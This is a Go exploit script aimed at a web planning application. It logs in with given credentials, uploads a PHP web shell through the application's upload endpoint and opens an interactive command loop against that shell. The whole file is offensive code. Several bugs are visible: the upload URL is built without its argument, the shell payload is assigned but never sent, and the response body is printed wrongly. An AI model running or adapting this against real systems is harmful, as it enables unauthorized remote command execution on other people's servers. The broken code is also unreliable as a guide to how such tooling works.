package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func commandShell(exploitURL string) {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("soplaning:~$ ")
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		encodedCommand := url.QueryEscape(command)
		commandRes, err := http.Get(fmt.Sprintf("%s?cmd=%s", exploitURL, encodedCommand))
		if err != nil {
			fmt.Printf("Error: An error occurred while running command: %s\n", command)
			continue
		}
		defer commandRes.Body.Close()

		if commandRes.StatusCode == 200 {
			fmt.Println("Output:")
			_, err := fmt.Fprintln(os.Stdout, commandRes.Body)
			if err != nil {
				fmt.Println("Error: Could not print output.")
			}
		} else {
			fmt.Printf("Error: Command failed with status code %d\n", commandRes.StatusCode)
		}
	}
}

func exploit(username, password, url string) {
	targetURL := fmt.Sprintf("%s/process/login.php", url)
	uploadURL := fmt.Sprintf("%s/process/upload.php")
	linkID := randomString(6)
	phpFilename := fmt.Sprintf("%s.php", randomString(3))

	// Login request
	loginData := fmt.Sprintf("login=%s&password=%s", username, password)
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(loginData))
	if err != nil {
		fmt.Println("Error: Failed to create request")
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	client := &http.Client{}
	res, err := client.Do(req)
	if err != nil {
		fmt.Println("Error: Failed to send login request")
		return
	}
	defer res.Body.Close()

	cookies := res.Cookies()

	// Upload web shell
	webShell := "<?php system($_GET['cmd']); ?>"
	multipartFormData := fmt.Sprintf("linkid=%s&periodeid=0&fichiers=%s&type=upload", linkID, phpFilename)

	req, err = http.NewRequest("POST", uploadURL, strings.NewReader(multipartFormData))
	if err != nil {
		fmt.Println("Error: Failed to create upload request")
		return
	}

	
	file := fmt.Sprintf("fichier-0=%s", webShell)
	req.Header.Set("Cookie", cookies[0].String()) 


	uploadRes, err := client.Do(req)
	if err != nil {
		fmt.Println("Error: Failed to send upload request")
		return
	}
	defer uploadRes.Body.Close()

	if uploadRes.StatusCode == 200 {
		fmt.Printf("[+] Uploaded ==> %s\n", uploadRes.Status)
		fmt.Println("[+] Exploit completed.")
		exploitURL := fmt.Sprintf("%s/upload/files/%s/%s", url, linkID, phpFilename)
		fmt.Printf("Access webshell here: %s?cmd=<command>\n", exploitURL)

		var input string
		fmt.Print("Do you want an interactive shell? (yes/no): ")
		fmt.Scanln(&input)
		if input == "yes" {
			commandShell(exploitURL)
		}
	}
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	rand.Seed(time.Now().UnixNano())
	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func main() {
	var targetURL, username, password string

	fmt.Print("Target URL (e.g., http://localhost:8080): ")
	fmt.Scanln(&targetURL)
	fmt.Print("Username: ")
	fmt.Scanln(&username)
	fmt.Print("Password: ")
	fmt.Scanln(&password)

	exploit(username, password, targetURL)
}
